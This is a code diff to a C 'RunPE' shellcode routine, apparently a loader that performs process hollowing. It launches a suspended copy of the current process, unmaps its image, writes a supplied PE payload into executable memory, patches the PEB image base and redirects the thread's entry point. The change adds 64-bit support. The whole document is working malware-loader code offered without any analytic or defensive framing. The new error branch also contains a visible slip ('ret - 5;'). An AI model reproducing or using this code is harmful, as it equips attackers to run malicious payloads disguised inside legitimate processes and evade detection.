@@ -4,7 +4,7 @@
 #include "x86-shellcode-runpe.h"
 
 int
-runpe(struct dll_imports *imports, PBYTE pe_image)
+runpe(struct dll_imports* imports, PBYTE pe_image)
 {
   int ret = 0;
 
@@ -35,15 +35,15 @@ runpe(struct dll_imports *imports, PBYTE pe_image)
   start_info.cb = sizeof start_info;
 
   if (!imports->CreateProcessW(cur_proc_path,
-                      imports->GetCommandLineW(),
-                      NULL,
-                      NULL,
-                      FALSE,
-                      CREATE_SUSPENDED,
-                      NULL,
-                      NULL,
-                      &start_info,
-                      &proc_info)) {
+                               imports->GetCommandLineW(),
+                               NULL,
+                               NULL,
+                               FALSE,
+                               CREATE_SUSPENDED,
+                               NULL,
+                               NULL,
+                               &start_info,
+                               &proc_info)) {
     return -2;
   }
 
@@ -59,19 +59,30 @@ runpe(struct dll_imports *imports, PBYTE pe_image)
 
   PVOID p_remote_base;
 
+  PEB dummy_peb;
+  /*
+    Reserved3[1] is the ImageBaseAddress field.
+  */
+#ifdef _WIN64
+  DWORD64 peb_offset =
+    ((DWORD64)&dummy_peb.Reserved3[1]) - ((DWORD64)&dummy_peb);
+#else
+  DWORD peb_offset = ((DWORD)&dummy_peb.Reserved3[1]) - ((DWORD)&dummy_peb);
+#endif
+
   if (!imports->ReadProcessMemory(
         proc_info.hProcess,
+#ifdef _WIN64
+        /*
+          Rdx is the foreign process PEB structure address.
+        */
+        (PVOID)(thread_ctx.Rdx + peb_offset),
+#else
         /*
           Ebx is the foreign process PEB structure address.
-
-          We want to access the ImageBaseAddress field.
-          Before that field there is 3 BOOLEAN types,
-          a BOOLEAN sized union, and an HANDLE.
-
-          see: http://bytepointer.com/resources/tebpeb32.htm
         */
-
-        (PVOID)(thread_ctx.Ebx + (sizeof(BOOLEAN) * 4 + sizeof(HANDLE))),
+        (PVOID)(thread_ctx.Ebx + peb_offset),
+#endif
         &p_remote_base,
         sizeof p_remote_base,
         NULL)) {
@@ -79,8 +90,12 @@ runpe(struct dll_imports *imports, PBYTE pe_image)
     goto kill_process;
   }
 
-  imports->ZwUnmapViewOfSection(proc_info.hProcess, p_remote_base);
-  
+  if (!NT_SUCCESS(
+        imports->ZwUnmapViewOfSection(proc_info.hProcess, p_remote_base))) {
+    ret - 5;
+    goto kill_process;
+  }
+
   /*
     We are allocating at the base address the image wants to run at
     without rebasing it with it's relocation directory if it has one.
@@ -112,29 +127,29 @@ runpe(struct dll_imports *imports, PBYTE pe_image)
 
   PBYTE p_mapped =
     imports->VirtualAllocEx(proc_info.hProcess,
-                                  (PVOID)p_nt->OptionalHeader.ImageBase,
-                                  p_nt->OptionalHeader.SizeOfImage,
-                                  MEM_COMMIT | MEM_RESERVE,
-                                  PAGE_EXECUTE_READWRITE);
+                            (PVOID)p_nt->OptionalHeader.ImageBase,
+                            p_nt->OptionalHeader.SizeOfImage,
+                            MEM_COMMIT | MEM_RESERVE,
+                            PAGE_EXECUTE_READWRITE);
   if (p_mapped == NULL) {
     ret = -5;
     goto kill_process;
   }
 
   if (!imports->WriteProcessMemory(proc_info.hProcess,
-                          p_mapped,
-                          pe_image,
-                          p_nt->OptionalHeader.SizeOfHeaders,
-                          NULL)) {
+                                   p_mapped,
+                                   pe_image,
+                                   p_nt->OptionalHeader.SizeOfHeaders,
+                                   NULL)) {
     ret = -6;
     goto kill_process;
   }
   for (size_t i = 0; i < p_nt->FileHeader.NumberOfSections; ++i) {
     if (!imports->WriteProcessMemory(proc_info.hProcess,
-                            p_mapped + p_sections[i].VirtualAddress,
-                            pe_image + p_sections[i].PointerToRawData,
-                            p_sections[i].SizeOfRawData,
-                            NULL)) {
+                                     p_mapped + p_sections[i].VirtualAddress,
+                                     pe_image + p_sections[i].PointerToRawData,
+                                     p_sections[i].SizeOfRawData,
+                                     NULL)) {
       ret = -7;
       goto kill_process;
     }
@@ -146,16 +161,17 @@ runpe(struct dll_imports *imports, PBYTE pe_image)
 
   if (!imports->WriteProcessMemory(
         proc_info.hProcess,
+#ifdef _WIN64
+        /*
+          Rdx is the foreign process PEB structure address.
+        */
+        (PVOID)(thread_ctx.Rdx + peb_offset),
+#else
         /*
           Ebx is the foreign process PEB structure address.
-
-          We want to access the ImageBaseAddress field.
-          Before that field there is 3 BOOLEAN types,
-          a BOOLEAN sized union, and an HANDLE.
-
-          see: http://bytepointer.com/resources/tebpeb32.htm
         */
-        (PVOID)(thread_ctx.Ebx + (sizeof(BOOLEAN) * 4 + sizeof(HANDLE))),
+        (PVOID)(thread_ctx.Ebx + peb_offset),
+#endif
         &p_mapped,
         sizeof p_mapped,
         NULL)) {
@@ -163,7 +179,18 @@ runpe(struct dll_imports *imports, PBYTE pe_image)
     goto kill_process;
   }
 
+#ifdef _WIN64
+  /*
+    The NT loader calls Rcx as the image's entrypoint.
+  */
+  thread_ctx.Rcx =
+    (DWORD64)(p_mapped + p_nt->OptionalHeader.AddressOfEntryPoint);
+#else
+  /*
+    The NT loader calls Eax as the image's entrypoint.
+  */
   thread_ctx.Eax = (DWORD)(p_mapped + p_nt->OptionalHeader.AddressOfEntryPoint);
+#endif
 
   if (!imports->SetThreadContext(proc_info.hThread, &thread_ctx)) {
     ret = -9;
